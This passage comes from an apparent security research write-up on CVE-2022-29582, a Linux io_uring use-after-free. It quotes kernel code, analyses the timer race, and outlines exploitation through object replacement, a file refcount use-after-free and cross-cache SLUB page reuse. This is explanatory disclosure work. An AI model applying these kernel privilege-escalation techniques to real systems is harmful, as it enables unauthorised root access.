    <span class="k">struct</span> <span class="n">io_ring_ctx</span> <span class="o">*</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">ctx</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">io_kiocb</span> <span class="o">*</span><span class="n">prev</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">spin_lock_irqsave</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">completion_lock</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">list_empty</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">link_list</span><span class="p">))</span> <span class="p">{</span>
        
            <span class="n">prev</span> <span class="o">=</span> <span class="n">list_entry</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">link_list</span><span class="p">.</span><span class="n">prev</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_kiocb</span><span class="p">,</span> <span class="n">link_list</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">refcount_inc_not_zero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">prev</span><span class="o">-&gt;</span><span class="n">refs</span><span class="p">))</span>
                <span class="n">list_del_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">link_list</span><span class="p">);</span>
            <span class="k">else</span>
                <span class="n">prev</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">spin_unlock_irqrestore</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">completion_lock</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">prev</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">io_async_find_and_cancel</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="n">prev</span><span class="o">-&gt;</span><span class="n">user_data</span><span class="p">,</span> <span class="o">-</span><span class="n">ETIME</span><span class="p">);</span>
        <span class="n">io_put_req_deferred</span><span class="p">(</span><span class="n">prev</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>   
        <span class="n">io_cqring_add_event</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="o">-</span><span class="n">ETIME</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">io_put_req_deferred</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">HRTIMER_NORESTART</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The internal control flow looks something like this:</p>

<figure>
<img src="/img/posts/cve-2022-29582/LTcallback.jpg" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Control flow through io_linked_timeout_fn</i></center></figcaption>
</figure>

<p>Most interesting here is the state where <code class="language-plaintext highlighter-rouge">LT.link_list</code> is non-empty and <code class="language-plaintext highlighter-rouge">T.refs == 0</code>. If these conditions are met, then we‚Äôll zip to the bottom left of the diagram, failing to remove <code class="language-plaintext highlighter-rouge">LT</code> from the <code class="language-plaintext highlighter-rouge">link_list</code>. Seems pretty fishy‚Ä¶</p>

<p>Think about it: <code class="language-plaintext highlighter-rouge">LT</code> has completed, meaning it will be destroyed (deallocated). Yet the reference from <code class="language-plaintext highlighter-rouge">T</code> to <code class="language-plaintext highlighter-rouge">LT</code> remains intact. Looks like we are getting hot on the trail of a bug. But to state anything conclusive, we still need to answer the question: <strong>in practice, is it possible for the <code class="language-plaintext highlighter-rouge">T</code> refcount to be 0 concurrently with <code class="language-plaintext highlighter-rouge">LT</code>‚Äôs timer firing?</strong></p>

<hr />

<h2 id="analysis-concurrent-completion-of-t-and-lt">Analysis: Concurrent completion of <code class="language-plaintext highlighter-rouge">T</code> and <code class="language-plaintext highlighter-rouge">LT</code></h2>
<p>We now know how the two completions work individually. So let‚Äôs combine them into concurrent operations! In particular, ones that violate memory safetyüòâ.</p>

<figure>
<img src="/img/posts/cve-2022-29582/concurrcompl.jpg" alt="Trulli" style="width:100%" />
<figcaption><center><i>Concurrent completions of T and LT. <br />T's refcount is decremented just before LT's path checks it.</i></center></figcaption>
</figure>

<p>Orange denotes the kernel thread path that is hit whenever <code class="language-plaintext highlighter-rouge">T</code> has to be flushed, and blue denotes the hrtimer hardirq context that is hit whenever <code class="language-plaintext highlighter-rouge">LT</code>‚Äôs timer fires.</p>

<p>If <code class="language-plaintext highlighter-rouge">T</code>‚Äôs refcount is decremented <em>before</em> <code class="language-plaintext highlighter-rouge">io_link_timeout_fn</code> checks it, <code class="language-plaintext highlighter-rouge">list_del_init</code> is never called to remove <code class="language-plaintext highlighter-rouge">LT</code> from the <code class="language-plaintext highlighter-rouge">link_list</code> list.</p>

<p>This can become a problem in a very specific situation: in order to reach this state, <code class="language-plaintext highlighter-rouge">T</code> has to already be scheduled for destruction, meaning that <code class="language-plaintext highlighter-rouge">LT</code> is always scheduled for destruction later than <code class="language-plaintext highlighter-rouge">T</code>. But what happens if despite this scheduling sequence, <code class="language-plaintext highlighter-rouge">LT</code> is freed <em>before</em> <code class="language-plaintext highlighter-rouge">T</code> is destroyed? Right, a dangling reference!</p>

<figure>
<img src="/img/posts/cve-2022-29582/destroysched.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Depending on how long the scheduling of destruction for T vs. LT takes, we can end up with a dangling reference to the freed LT.</i></center></figcaption>
</figure>

<p>Internally, the deferred destruction is implemented using kernel <code class="language-plaintext highlighter-rouge">work</code>, an abstraction on top of <code class="language-plaintext highlighter-rouge">softirq</code>s. It turns out that it is in fact possible for two different work entries to be executed out of order with respect to their initial queue times. This could happen e.g. when the work is queued on different CPUs with different workloads, or honestly, just pure luck.</p>

<p>It‚Äôs starting to look like we have a proper bug now. But a dangling reference is only useful if it is ever dereferenced.</p>

<hr />

<h2 id="racing-the-deferred-workers">Racing the deferred workers</h2>

<p>At this point we‚Äôve deferred the destruction of both <code class="language-plaintext highlighter-rouge">T</code> and <code class="language-plaintext highlighter-rouge">LT</code>.</p>

<figure>
<img src="/img/posts/cve-2022-29582/workercb.jpg" alt="Trulli" style="width:100%" />
    <figcaption><center><i>io_put_req_deferred_cb is called as request destruction work.</i></center></figcaption>
</figure>

<p>When those worker threads start, we‚Äôll have a race through <code class="language-plaintext highlighter-rouge">io_free_req()</code> :running:</p>

<figure>
<img src="/img/posts/cve-2022-29582/greenpurple.jpg" alt="Trulli" style="width:100%" />
    <figcaption><center><i>If green frees LT before purple accesses LT in io_kill_linked_timeout<br />then we have a Use-After-Free.</i></center></figcaption>
</figure>

<p>Purple denotes the worker which destroys <code class="language-plaintext highlighter-rouge">T</code>. Green denotes the worker which destroys <code class="language-plaintext highlighter-rouge">LT</code>. As we can see, there is a possible race sequence where <code class="language-plaintext highlighter-rouge">LT</code> is freed sometime before <code class="language-plaintext highlighter-rouge">T</code> retrieves it from the <code class="language-plaintext highlighter-rouge">link_list</code>. Accessing <code class="language-plaintext highlighter-rouge">LT</code> at any point after this sequence will be a Use-After-Free. In other words, we have our bug!</p>

<hr />

<h1 id="exploitation">Exploitation</h1>
<p>To recap the bug: <code class="language-plaintext highlighter-rouge">T</code> retains a dangling reference which it follows to <code class="language-plaintext highlighter-rouge">LT</code> when being destroyed.</p>

<h2 id="replacing-lt">Replacing <code class="language-plaintext highlighter-rouge">LT</code></h2>
<p>In order to exploit this Use-After-Free bug we perform <strong>object replacement</strong>. The aim is to reallocate another object <code class="language-plaintext highlighter-rouge">LT'</code> at the address of <code class="language-plaintext highlighter-rouge">LT</code> to direct control flow at a point where the kernel expects to see <code class="language-plaintext highlighter-rouge">LT</code>. Object replacement is possible because after <code class="language-plaintext highlighter-rouge">LT</code> is freed, the kernel heap allocator is allowed to recycle <code class="language-plaintext highlighter-rouge">LT</code>‚Äôs underlying memory to service another allocation (<code class="language-plaintext highlighter-rouge">LT'</code>).</p>

<figure>
<img src="/img/posts/cve-2022-29582/replace.jpg" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Object replacement causes confusion, which can escalate our control.</i></center></figcaption>
</figure>

<p>In some scenarios it‚Äôs easy to replace an object on the fly. But we are constrained in two ways:</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">LT'</code> has to be allocated and initialised in a <strong>race window</strong>. That is, after <code class="language-plaintext highlighter-rouge">LT</code> is freed but before we reach a point where <code class="language-plaintext highlighter-rouge">LT</code> is no longer accessed e.g. after <code class="language-plaintext highlighter-rouge">T</code> is freed.</li>
  <li><code class="language-plaintext highlighter-rouge">LT'</code> can only be another <code class="language-plaintext highlighter-rouge">struct io_kiocb</code> object. Due to <strong>heap isolation</strong>, where heap objects are separated based on their type, it is too difficult to reallocate as a different type of object within the race window.</li>
</ol>

<p>Okay, so continuing from the worker thread race, let‚Äôs introduce a third racer!</p>

<figure>
<img src="/img/posts/cve-2022-29582/red.jpg" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Adding a new racer to allocate LT' at the same place as LT.</i></center></figcaption>
</figure>

<p>We‚Äôre already familiar with the purple and green workers. But who‚Äôs the new racer in town? The red worker replaces <code class="language-plaintext highlighter-rouge">LT</code> with <code class="language-plaintext highlighter-rouge">LT'</code> before, or during, purple‚Äôs attempt to access <code class="language-plaintext highlighter-rouge">LT</code>. Notice that <code class="language-plaintext highlighter-rouge">LT'</code> is a request of operation type <code class="language-plaintext highlighter-rouge">IORING_OP_TEE</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">io_tee</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_kiocb</span> <span class="o">*</span><span class="n">req</span><span class="p">,</span> <span class="n">bool</span> <span class="n">force_nonblock</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">io_splice</span> <span class="o">*</span><span class="n">sp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">splice</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">in</span> <span class="o">=</span> <span class="n">sp</span><span class="o">-&gt;</span><span class="n">file_in</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">sp</span><span class="o">-&gt;</span><span class="n">file_out</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span> <span class="o">=</span> <span class="n">sp</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">SPLICE_F_FD_IN_FIXED</span><span class="p">;</span>
	<span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="p">...</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">)</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">do_tee</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">sp</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>

	<span class="n">io_put_file</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="p">(</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">SPLICE_F_FD_IN_FIXED</span><span class="p">));</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>
<p>An <code class="language-plaintext highlighter-rouge">IORING_OP_TEE</code> request takes in two files: it reads data from<code class="language-plaintext highlighter-rouge">in</code> and splices (writes) data to <code class="language-plaintext highlighter-rouge">out</code> . This assists us in exploiting the bug: we can block indefinitely in <code class="language-plaintext highlighter-rouge">do_tee()</code> by making it read from a pipe end. This way, we can ensure that <code class="language-plaintext highlighter-rouge">LT'</code> stays alive for as long as we want to, stabilising the exploit.</p>

<p>When we‚Äôre ready, we can make data available to read through <code class="language-plaintext highlighter-rouge">in</code>, by writing to the other pipe end. This resumes execution: the thread will return from <code class="language-plaintext highlighter-rouge">do_tee()</code> and enter <code class="language-plaintext highlighter-rouge">io_put_file()</code>.</p>

<hr />

<h2 id="releasing-refs-on-lt">Releasing refs on <code class="language-plaintext highlighter-rouge">LT'</code></h2>
<p>At this point we‚Äôve replaced <code class="language-plaintext highlighter-rouge">LT</code> with <code class="language-plaintext highlighter-rouge">LT'</code>, contradicting the purple worker‚Äôs expectation of <code class="language-plaintext highlighter-rouge">LT</code>. This may be good for us if we can cause another Use-After-Free on <code class="language-plaintext highlighter-rouge">LT'</code> or an object it owns. However, there‚Äôs a point after which purple no longer accesses <code class="language-plaintext highlighter-rouge">LT'</code> as <code class="language-plaintext highlighter-rouge">LT</code>‚Äôs relevance to <code class="language-plaintext highlighter-rouge">T</code>‚Äôs destruction is limited.</p>

<p>The question now is: 
<strong>What does purple do to <code class="language-plaintext highlighter-rouge">LT'</code> and how does <code class="language-plaintext highlighter-rouge">LT'</code> influence purple‚Äôs control flow?</strong></p>

<p>In order to answer this, we will continue roughly from where purple first uses <code class="language-plaintext highlighter-rouge">LT'</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">io_kill_linked_timeout</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_kiocb</span> <span class="o">*</span><span class="n">req</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">io_ring_ctx</span> <span class="o">*</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">ctx</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">io_kiocb</span> <span class="o">*</span><span class="n">link</span><span class="p">;</span>
	<span class="n">bool</span> <span class="n">cancelled</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>

	<span class="n">spin_lock_irqsave</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">completion_lock</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
	<span class="n">link</span> <span class="o">=</span> <span class="n">list_first_entry_or_null</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">link_list</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_kiocb</span><span class="p">,</span>
					<span class="n">link_list</span><span class="p">);</span>
	<span class="cm">/*
	 * Can happen if a linked timeout fired and link had been like
	 * req -&gt; link t-out -&gt; link t-out [-&gt; ...]
	 */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">link</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">link</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">REQ_F_LTIMEOUT_ACTIVE</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">io_timeout_data</span> <span class="o">*</span><span class="n">io</span> <span class="o">=</span> <span class="n">link</span><span class="o">-&gt;</span><span class="n">async_data</span><span class="p">;</span>
		<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

		<span class="n">list_del_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">link</span><span class="o">-&gt;</span><span class="n">link_list</span><span class="p">);</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">hrtimer_try_to_cancel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">io</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">io_cqring_fill_event</span><span class="p">(</span><span class="n">link</span><span class="p">,</span> <span class="o">-</span><span class="n">ECANCELED</span><span class="p">);</span>
			<span class="n">io_commit_cqring</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
			<span class="n">cancelled</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">req</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">REQ_F_LINK_TIMEOUT</span><span class="p">;</span>
	<span class="n">spin_unlock_irqrestore</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">completion_lock</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">cancelled</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">io_cqring_ev_posted</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
		<span class="n">io_put_req</span><span class="p">(</span><span class="n">link</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The internal control flow looks something like this:</p>

<figure>
<img src="/img/posts/cve-2022-29582/killcf.jpg" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Internal control flow for io_kill_linked_timeout</i></center></figcaption>
</figure>

<p>Since <code class="language-plaintext highlighter-rouge">LT'</code> is an <code class="language-plaintext highlighter-rouge">IORING_OP_TEE</code> request, it‚Äôs not an active timeout. This implies that:</p>
<ol>
  <li>Yet again, we don‚Äôt remove <code class="language-plaintext highlighter-rouge">LT'</code> from <code class="language-plaintext highlighter-rouge">link_list</code>.</li>
  <li>Since we don‚Äôt try to cancel the <code class="language-plaintext highlighter-rouge">LT'</code> timer, we also don‚Äôt release a reference to <code class="language-plaintext highlighter-rouge">LT'</code>.</li>
</ol>

<p>Okay, interesting. But nothing really jumps out of the screen. So let‚Äôs keep digging. 
After we return from <code class="language-plaintext highlighter-rouge">io_kill_linked_timeout()</code> we are back in <code class="language-plaintext highlighter-rouge">__io_req_find_next()</code>:</p>

<figure>
<img src="/img/posts/cve-2022-29582/faillinks.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Reaching io_fail_links after io_kill_linked_timeout</i></center></figcaption>
</figure>

<p>Since the <code class="language-plaintext highlighter-rouge">REQ_F_FAIL_LINK</code> flag is indeed set for <code class="language-plaintext highlighter-rouge">T</code>, we take the <code class="language-plaintext highlighter-rouge">io_fail_links(T)</code> path. We know that <code class="language-plaintext highlighter-rouge">LT'</code> is not an active timeout, meaning it was <strong>not</strong> removed from <code class="language-plaintext highlighter-rouge">link_list</code> in <code class="language-plaintext highlighter-rouge">io_kill_linked_timeout()</code>. So <code class="language-plaintext highlighter-rouge">T-&gt;link_list.next == LT'</code>.</p>

<p>From <code class="language-plaintext highlighter-rouge">io_fail_links()</code>, two refcounts are released on <code class="language-plaintext highlighter-rouge">LT'</code>. Since new requests start with <code class="language-plaintext highlighter-rouge">refs == 2</code>, <code class="language-plaintext highlighter-rouge">LT'</code> is set to be cleaned up and destroyed! Now <em>this</em> is starting to look good!</p>

<hr />

<h2 id="cleaning-up-lt">Cleaning up <code class="language-plaintext highlighter-rouge">LT'</code></h2>

<figure>
<img src="/img/posts/cve-2022-29582/LT2cleanup.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Cleaning up LT' releases a file ref</i></center></figcaption>
</figure>

<p><code class="language-plaintext highlighter-rouge">LT'</code>‚Äôs cleanup phase releases a reference to <code class="language-plaintext highlighter-rouge">req-&gt;spice.file_in</code>. After this, the file‚Äôs refcount is <code class="language-plaintext highlighter-rouge">1</code>. But is there actually only one reference to this file?</p>

<p>Nope :) ! We hold two references: one from when <code class="language-plaintext highlighter-rouge">LT'</code> was setup, its handling thread now blocked in <code class="language-plaintext highlighter-rouge">do_tee()</code>. The other, because we had to create the <code class="language-plaintext highlighter-rouge">in</code> pipe in the first place. So we‚Äôve still got a userspace file descriptor which resolves to the <code class="language-plaintext highlighter-rouge">in</code> <code class="language-plaintext highlighter-rouge">file</code>.</p>

<hr />

<h2 id="releasing-the-final-file-ref">Releasing the final <code class="language-plaintext highlighter-rouge">file</code> ref</h2>
<p>To summarise where we‚Äôre at: upon triggering the Use-After-Free we reallocated <code class="language-plaintext highlighter-rouge">LT</code> as <code class="language-plaintext highlighter-rouge">LT'</code> - a request of type <code class="language-plaintext highlighter-rouge">IORING_OP_TEE</code>. This then allowed us to fix <code class="language-plaintext highlighter-rouge">LT'</code> in memory by blocking in <code class="language-plaintext highlighter-rouge">do_tee()</code>. Having won the race, we cleaned and destroyed <code class="language-plaintext highlighter-rouge">LT'</code> from the perspective of the worker thread handling <code class="language-plaintext highlighter-rouge">T</code>‚Äôs destruction. Finally, we upgraded the Use-After-Free into an <strong>incorrect refcount</strong> on a pipe <code class="language-plaintext highlighter-rouge">file</code> object.</p>

<p>It‚Äôs been a big journey so far. But we have a while to go before root. So let‚Äôs get to it :small_airplane:.</p>

<p>Remember that we chose <code class="language-plaintext highlighter-rouge">IORING_OP_TEE</code> because it allowed us to stabilise the exploit. But there‚Äôs another, more nefarious, reason.</p>

<figure>
<img src="/img/posts/cve-2022-29582/wakeup.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Calling io_put_file to free the file</i></center></figcaption>
</figure>

<p>Once we make data available to read through the <code class="language-plaintext highlighter-rouge">in</code> <code class="language-plaintext highlighter-rouge">file</code>, we wake up the <code class="language-plaintext highlighter-rouge">pipe-&gt;rd_wait</code> wait queue head. Since <code class="language-plaintext highlighter-rouge">pipe_readable(pipe)</code> is now true, this splices the data read from <code class="language-plaintext highlighter-rouge">in</code> onto the <code class="language-plaintext highlighter-rouge">out</code> pipe <code class="language-plaintext highlighter-rouge">file</code>. Then we return from <code class="language-plaintext highlighter-rouge">do_tee()</code>, into <code class="language-plaintext highlighter-rouge">io_put_file(req, in, ...)</code> which releases another reference to <code class="language-plaintext highlighter-rouge">in</code>.</p>

<p>Because we were able to release a reference to <code class="language-plaintext highlighter-rouge">in</code> when we destroyed <code class="language-plaintext highlighter-rouge">LT'</code>, <code class="language-plaintext highlighter-rouge">in</code>‚Äôs refcount is now <code class="language-plaintext highlighter-rouge">0</code>. So <code class="language-plaintext highlighter-rouge">in</code> will be freed! This gives us a very powerful primitive, since we retain a tangible reference to it from usermode. More exactly, when we invoke system calls with the associated file descriptor, then we‚Äôll actually be operating on a stale <code class="language-plaintext highlighter-rouge">file</code> object in kernelspace.</p>

<hr />

<h2 id="crossing-the-cache-boundary">Crossing the cache boundary</h2>
<p>So, what to do with our <code class="language-plaintext highlighter-rouge">file</code> Use-After-Free? Can we just replace it with another object, maybe partially overwriting a function pointer to get code execution?</p>

<p>Just like with <code class="language-plaintext highlighter-rouge">io_kiocb</code> objects, we again run into <strong>heap isolation</strong>. While heap isolation isn‚Äôt a security mitigation in its own right, it can inadvertently prevent or make the exploitation of heap based bugs extremely difficult. Unlike earlier, we‚Äôll actually attempt to bypass it in this section. But before then, some background.</p>

<h3 id="slab-caches">Slab caches</h3>
<p>The SLUB allocator (<code class="language-plaintext highlighter-rouge">mm/slub.c</code>) organises the kernel heap according to the techniques of <strong>slab allocation</strong>. Slabs of memory are preemptively sliced into object-sized units. Further, slabs comprise what we call <strong>slab caches</strong>. Important for us: different caches service different types of objects. In this way, different slab caches or heaps are isolated from one another.</p>

<p>Our <code class="language-plaintext highlighter-rouge">file</code> has its own exclusive <strong>dedicated cache</strong> ‚Äì known as <code class="language-plaintext highlighter-rouge">filp</code>. Only <code class="language-plaintext highlighter-rouge">struct file</code> objects may be allocated in the <code class="language-plaintext highlighter-rouge">filp</code> cache. This means that we can‚Äôt allocate some arbitrary object at the address of our <code class="language-plaintext highlighter-rouge">file</code>. We are, at least nominally, constrained to reallocate the <code class="language-plaintext highlighter-rouge">file</code> as just another object of the same type.</p>

<p>Of course, it isn‚Äôt always the case that we are limited in this way. Some objects do share the same cache. For example, objects which come from a <strong>general cache</strong> will share it with other objects of a similar size (i.e. general caches are ‚Äútyped‚Äù solely based on the maximum size of their objects).</p>

<p>Further, dedicated caches can be merged ‚Äì meaning that despite having different names and managers they still come from the same underlying memory. Unfortunately, the former option isn‚Äôt true for <code class="language-plaintext highlighter-rouge">file</code> objects and the latter option is a dead end on the target system.</p>

<p>However, at the end of the day, we‚Äôre still dealing with an allocator, and an allocator has to be able to reuse freed memory. If you think about it, shouldn‚Äôt every slab be mergable on the level of raw memory?</p>

<h3 id="the-memory-hierarchy">The memory hierarchy</h3>
<p>Slabs are allocated from the more fundamental: <strong>pages</strong> of memory (see appendix for a discussion on paging). Pages are grouped into zones and also into different nodes if we‚Äôre using <a href="https://en.wikipedia.org/wiki/Non-uniform_memory_access">NUMA</a>:</p>

<figure>
<img src="/img/posts/cve-2022-29582/mem.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Visualisation of the Linux memory hierarchy</i></center></figcaption>
</figure>

<p>Right now we‚Äôve got a <code class="language-plaintext highlighter-rouge">file</code> object which is sitting on a slab in a morgue. We can‚Äôt reallocate it as a more useful object (with which to overwrite its contents).  So if we stay at the level of the SLUB allocator then we‚Äôve reached a dead end. But at a lower level, each slab is built on top of conjoined pages and these pages are the objects of allocation and deallocation too! Let‚Äôs think through the implications of this‚Ä¶</p>

<h3 id="page-use-after-free">Page use-after-free</h3>

<p>If by some miracle we are able to free the underlying page back to the page allocator then we might be able reallocate the page to a more helpful slab cache. Rather than merely holding a stale reference to the pipe <code class="language-plaintext highlighter-rouge">file</code> object, we can extend this into a stale page reference.</p>

<p>Let‚Äôs hypothesise about what it means for a page to be free. For one, returning a page to the page allocator (<code class="language-plaintext highlighter-rouge">mm/page_alloc.c</code>) likely implies that it‚Äôs empty. This means that at the very least we need to free all objects which neighbour the target <code class="language-plaintext highlighter-rouge">file</code>. But this isn‚Äôt sufficient by itself. The SLUB allocator keeps empty pages around just in case they need to be used again in the near future.</p>

<p>Empty pages and partially empty pages are typically hooked up to a <strong>cpu partial list</strong>. It‚Äôs a partial list because the pages are partially empty. It‚Äôs a CPU list because there‚Äôs one for each CPU. Each cpu partial list is managed by a CPU cache, all of which are held by a general cache manager. So there‚Äôs a manager for <code class="language-plaintext highlighter-rouge">filp</code>, <code class="language-plaintext highlighter-rouge">kmalloc-512</code>, and so on.</p>

<figure>
<img src="/img/posts/cve-2022-29582/slabcache.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>The relevant fields in the slab cache descriptors</i></center></figcaption>
</figure>
<p>The general manager type <code class="language-plaintext highlighter-rouge">struct kmem_cache</code> describes each individual slab cache. Our <code class="language-plaintext highlighter-rouge">file</code> object‚Äôs slab cache is named ‚Äúfilp‚Äù. <code class="language-plaintext highlighter-rouge">struct kmem_cache</code> objects point to <code class="language-plaintext highlighter-rouge">struct kmem_cache_cpu</code> (CPU cache descriptor) objects. From each of these we get two major collections of objects. The first are those objects which sit on <strong>partial slabs</strong> together forming the <strong>cpu partial list</strong>. The second are those objects comprising the Very Hungry Caterpillar :100:. No no, these objects actually comprise the <strong>active slab</strong>. The active slab, <code class="language-plaintext highlighter-rouge">struct page *page</code> in the CPU cache descriptor, is where the next object will be reserved.</p>

<p>If a slab is full and is not the active slab, the SLUB allocator stops tracking it. It regains control over the slab when an object from this slab is returned to the SLUB allocator. The object‚Äôs slab is then linked back up to the partial list.</p>

<h4 id="how-do-we-allocate-a-new-page">How do we allocate a new page?</h4>
<p>An extreme case is when there are no available objects in the cache. At this point, we need to request a whole new slab.</p>

<figure>
<img src="/img/posts/cve-2022-29582/newslab.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Allocating a new slab</i></center></figcaption>
</figure>
<p>In the above diagram we keep trying to get a slab from one of the many lists available to a cache. Until finally, we get to asking for a new slab. The new slab is express-shipped from the page allocator.</p>

<p>So that explains how to allocate a new page - just fill up all the pages in use by the cache and make the SLUB allocator request another slab. This can be done just by spamming with the system calls which allocate the target object. So for us, we can do that by calling <code class="language-plaintext highlighter-rouge">open()</code> or <code class="language-plaintext highlighter-rouge">pipe()</code>.</p>

<h4 id="how-to-free-a-page">How to free a page?</h4>
<p>Let‚Äôs say that we free an object <code class="language-plaintext highlighter-rouge">f</code> whose slab (or page) is denoted by <code class="language-plaintext highlighter-rouge">P</code>.</p>

<figure>
<img src="/img/posts/cve-2022-29582/freeslab.jpg" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Freeing a slab</i></center></figcaption>
</figure>
<p>In the diagram above, we enter through <code class="language-plaintext highlighter-rouge">__slab_free()</code>. Then to reach <code class="language-plaintext highlighter-rouge">put_cpu_partial()</code>, its purpose being to place the object‚Äôs slab on the CPU partial list, we need it to be true that this slab was previously full and is not the active slab. Remember that full slabs are not accounted for. So when an object from a once full slab is freed back to the SLUB allocator its slab needs to be put onto the partial list for tracking.</p>

<p>To arrive at <code class="language-plaintext highlighter-rouge">unfreeze_partials()</code> we need to satisfy a very important condition: that the ‚Äúpartial array is full‚Äù. This means we‚Äôll ‚Äúmove the existing set to the per node partial list‚Äù (quoting the comments). Cross-cache achieves this in the following way:</p>

<figure>
<img src="/img/posts/cve-2022-29582/partialoverflow.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Overflowing the cpu partial list</i></center></figcaption>
</figure>
